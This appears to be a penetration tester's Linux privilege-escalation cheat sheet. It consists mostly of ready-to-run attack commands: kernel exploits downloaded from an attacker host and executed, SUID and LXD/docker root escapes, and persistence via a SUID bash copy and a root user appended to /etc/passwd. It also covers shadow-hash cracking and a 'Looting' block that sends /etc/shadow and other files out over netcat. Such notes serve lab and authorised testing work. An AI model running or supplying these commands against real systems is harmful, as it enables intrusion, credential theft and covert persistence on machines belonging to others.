# Linux
## Metasploit
`run post/multi/recon/local_exploit_suggester`
## Setup
| Command Type     | Description                      | Command                                                               |
|:-----------------|:--------------------------------:|:---------------------------------------------------------------------|
| Shell Cleanup    | Python 2     | `python -c 'import pty;pty.spawn("/bin/bash")'`                                               |
| Shell Cleanup    | Python 3     | `python3 -c 'import pty;pty.spawn("/bin/bash")'`                                              |
| Shell Cleanup    | Perl  | `perl -e 'exec "/bin/bash";'` |
| Shell Cleanup    | Export xterm | `export TERM=xterm`                                                                           |
| Shell Cleanup    | Background  Process | `^z`                                                                                   |
| Shell Cleanup    | stty command | `stty raw -echo`                                                                              |
| Shell Cleanup    | Foreground | `fg <enter>`                                                                                    |
| Shell Cleanup    | stty command (Fix size) | `stty rows 50 columns 199` |
| Shell Cleanup    | Metasploit | `sessions -u 1`                                                                                 |
| Shell Cleanup    | Add paths (Missing Apps) | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`        |
| Escape RBASH     | Use ssh to run bash with no profile | `ssh $user@$ip -t "bash --noprofile"`                       |
| Fix Path     | Load binaries into the path | `export PATH=/bin:/usr/bin:$PATH`                       |
| Set Variables    | Load binaries into the path | `export lhost=$lhost`                       |

## Quick Wins
| Command Type | Command |
|--------------|---------|
| Sudo | `sudo -l` |
| SUID | `find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 6 -exec ls -ld {} \; 2>/dev/null` |

## Automated Tools
| Command Type     | Description                                | Command                                                               |
| -----------------|:------------------------------------------|:---------------------------------------------------------------------|
| set variables    | Set lhost variables | `export lhost=192.168.119.127` |
| set variables    | Set lhost variables | `export lhost=10.4.29.43` |
| wget             | Download privesc scripts         | `cd /tmp; mkdir privesc; cd privesc; wget -r -nd http://$lhost/linux/privesc/` |
| wget             | Download linpeas | `wget http://$lhost/linux/privesc/linpeas.sh` |
| curl             | Download privesc scripts         | `curl -o linpeas.sh http://$lhost/linux/privesc/linpeas.sh`                   |
| chmod            | Give scripts execute permission  | `chmod -R 777 ./`                                       |
| linpeas          | Execute Linpeas                  | `./linpeas.sh`                                       |
| All in one       | Execute all other scripts        | `./linpeas.sh > linpeas.txt;./len.sh -t > len.txt;./lle.sh > lle.txt; ./lse.sh -i -l 2 > lse.txt; python lpc.py > lpc.txt; ./upc detailed > upc.txt` | 
| rm & tar         | Delete files & compress          | `rm *.sh *.py *.log *.html *.pl psp* upc unix* && cd ../ && tar -cvf privesc.tar ./privesc/ && rm -r privesc/`                                       |
| nc               | Send to Kali host via netcat     | `nc $lhost 235 < privesc.tar` |
| Exploit Suggester | Run on Kali host inf X.X.XX format | |`/root/share/linux/privesc/linux-exploit-suggester-2.pl â€“k $kernel` |


## Port Tunneling
| Info | Command | 
|:-----|:--------|
| Copy binary to guest | `wget http://$lhost/chisel`
| Kali Host (Listen on 9050 Forware 10000) | `chisel server -p 9050 --reverse` |
| Linux Target (Forward port 10000) | `./chisel client 10.10.0.63:9050 R:10000:127.0.0.1:10000` |

## Fix for exploits not compiling on targets
`PATH=PATH$:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/gcc/x86_64-linux-gnu/4.8/;export PATH`

## Compile Exploits 
### This works 32bit compiled on 64bit linux
`gcc -o 9542 9542.c -m32 -Wall -Wl,--hash-style=bot`
### Confirmed
| Exploit | Kernel | Command | 
|---------|--------|---------|
| overlayfs | 3.13, 3.16.0, 3.19.0 | `wget http://$lhost/kernel-exploits/overlayfs/ofs_64; chmod +x ofs_64; ./ofs_64` |
| overlayfs (37292) | 3.13.0 | `wget http://$lhost/linux/exploits/kernel/37292.c; gcc 37292.c -o ofs; ./ofs` |
| 'double-fdput()' bpf(BPF_PROG_LOAD) | 4.4.x (Ubuntu 16.04) | `wget http://$lhost/linux/exploits/kernel/39772/exploit.tar; tar xvf exploit.tar; cd ebpf_mapfd_doubleput_exploit; chmod +x compile.sh; ./compile.sh; ./doubleput` |
| cowroot | 2.6.22 < 3.9 (x64) (Precompiled) | `wget http://$lhost/linux/exploits/kernel/cowroot_64; chmod +x cowroot_64; ./cowroot_64` |
| cowroot | 2.6.22 < 3.9 (x64) (Compiled) | `wget http://$lhost/linux/exploits/kernel/cowroot_64.c; gcc cowroot_64.c -o cowroot_64 -pthread; ./cowroot_64` |
| c0w | 2.6.22 < 3.9 (x64) (Compiled) | `wget http://$lhost/linux/exploits/kernel/c0w_64.c; gcc -pthread c0w_64.c  -o c0w_64; ./c0w_64`
| Dirty COW /proc/self/mem Race Condition Privilege Escalation (/etc/passwd Method)  | 2.6.22 < 3.9 & 4.4 |`wget http://$lhost/linux/exploits/kernel/40847.cpp; g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dirtycow 40847.cpp -lutil; chmod 777 dirtycow; ./dirtycow; su` |
| Linux Kernel (Ubuntu 16.04.4) - Local Privilege Escalation | < 4.4.0-116 | `wget http://$lhost/linux/exploits/kernel/44298; chmod +x 44298; ./44298`
| Linux Kernel (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation  | < 4.13.9 | `wget http://$lhost/linux/exploits/kernel/45010; chmod +x 45010; ./45010`



# LXD Group
## Download images
`wget http://$lhost/linux/privesc/lxd/lxd.tar.xz`

`wget http://$lhost/linux/privesc/lxd/rootfs.squashfs`

## Import images

`lxc image import lxd.tar.xz rootfs.squashfs --alias alpine`

`lxc image list # You can see your new imported image`

## Initialze the container

`lxc init alpine privesc -c security.privileged=true`

## Create storage if needed

`lxd init`

## Mount the local file system

`lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true`

## Start the container

`lxc start privesc`

## Get a shell in the container

`lxc exec privesc /bin/sh `


## File capabilities
https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/

## Ability to sniff traffic? 
`tcpdump -A -n -i lo -vv`

# Create persistence with privileges
## rootbash
* Run the following commands with root to create a reusable root privsec
```bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
```
## add public ssh key to authorized keys
```bash
echo "********" > authorized_keys
```
## Create shell script

  `echo "/bin/sh" > service`
  `chmod +x service`

## Create c program
```c
#include <stdio.h>
#include <unistd.h>

int main (void) {
    char *argv[] = { "/bin/bash", "-p", NULL };
    execve(argv[0], argv, NULL);
}
```
## Kernel Exploits
* Check lpc.txt
  
  `cat lpc.txt`

* Google kernel + 'kernel priv esc'

  `$kernel kernel priv esc`

* Search for kernel & priv esc

  `searchsploit linux kernel $kernel priv esc`

* Search for kernel & distribution

  `searchsploit linux kernel $kernel debian priv esc`
  `searchsploit linux kernel $kernel -e | grep exploits| awk -F "|" '{ print $2 }' | awk '{ print $1}'`

* Linux Exploit Suggester 2

  `/root/share/linux/privesc/linux-exploit-suggester-2.pl -k $kernel`

## Weak File Permissions
* Check shadow file permissions (Read allows password cracking / Write game over)

  `ls -l /etc/shadow`

* If writeable generate a new password hash

  `openssl passwd "password"`

* Copy the generate password into the second field of the root user line (Replace x)
* Switch to root user

  `su`
### Writeable files
`find /etc/ -type f -writable 2>/dev/null`
## Credential Access
### Reused Passwords
### Credentials from Configuration Files
#### Check /var/log/audit/
```bash
cd /var/log/audit && cat * | grep 'comm="su"'
```
### Credentials from Local Database
### Credentials from Bash History
.mysql_history

### Credentials from network capture
* Show up and running network interfaces

  `tcpdump -D`

* Capture network traffic for 140 seconds

  `timeout 140 tcpdump -w cap.pcab -i $nic`

* View captured network traffic

  `tcpdump -r hehe.pcab`

### SSH Keys
### Sudo Access
* Use sudo to gain access to another users account

`sudo -i -u scriptmanager`

### Group Privileges (Docker, LXD, etc)
* If member of a docker group

```bash
docker images
docker run -v /:/mnt --rm -it privesc chroot /mnt sh
```
![Example](https://github.com/Michael-Cheney/pentest/blob/master/Method/03.%20Privilege%20Escalation/images/2021-01-08%2023_40_11.png)


## Exploit
### Services running on local host
* Check for Services running as root

`ps aux | grep "^root"`

### Kernel Version
### Binary File Versions
## Misconfiguration
### Cron Jobs
#### Writeable Cron Job
#### Writeable Cron Job Dependency (File, PYthon Library, etc)
### SUID/SGID Files

| Command | Type | Command                                                               |
| ------------------|------|-----------------------------------------------------------------------|
| base32            | SUID | `base32 "/etc/shadow" \| base32 --decode`                              |
| base32            | SUID | `base32 "/root/.ssh/id_rsa" \| /usr/bin/base32 --decode`               |
| Find              | SUID | `find . -exec /bin/sh -p \; -quit`                                    |
| nmap 1.1          | SUID | `nmap --interactive`                                                  |
| nmap 1.2          | SUID | `!sh`                                                                 |
| perl              | SUID | `perl -e 'exec "/bin/sh";'`                                           |
| pkexec            | SUID | `sudo pkexec /bin/sh`                                                 |
| php 1.1           | SUID | `CMD="/bin/sh"`                                                       |
| php 1.2           | SUID | `/usr/bin/php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"`                 |
| screen | SUID | `wget http://$lhost/linux/exploits/suid/41154.sh; chmod +x 41154.sh; ./41154.sh`
| start-stop-daemon | SUID | `/usr/sbin/start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p`          |
| snap | SUID | `https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py` | 



### Interesting Capabilities on Binary
### Sensative Files Writeable
#### /etc/passwd
* Add new credentials (login with hack / 123)

`echo 'hack:'$(openssl passwd -1 -salt hack 123)':0:0:root:/root:/bin/bash' >> /etc/passwd`

#### /etc/shadow
#### /etc/sudoers
#### Configuration Files
### Sensitive Files Readable
#### /etc/shadow
Get Permissions (If read can decrypt, if write game over)
```bash
ls -l /etc/shadow
```
Read root user password hash
```bash
head -n 1 /etc/shadow
```
Save the password hash
```bash
echo '$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVl
aXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0' > hash.txt'
```
Crack the password using John
```bash
john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
#### /root/.ssh/id_rsa (Private Keys)
### Writeable Path
### Root $PATH Writeable
### Directory in PATH Writeable
### LD_PRELOAD Set in /etc/sudoers

## Looting
```
cd /tmp; mkdir loot; cd loot
cp /etc/passwd .; cp /etc/shadow .; cp /root/proof.txt .
cd ../ && tar -cvf loot.tar ./loot/ && rm -r loot/
nc $lhost 235 < loot.tar
```

## Python

### Impersonate Modules
If you have something like the below that you can run as sudo. Create a reverse shell as /tmp/datetime.py & run command as 'sudo PYTHONPATH=/tmp /opt/script.py'

Code
```python
#!/usr/bin/python3                                                                                                                                                                                              
from datetime import datetime
```
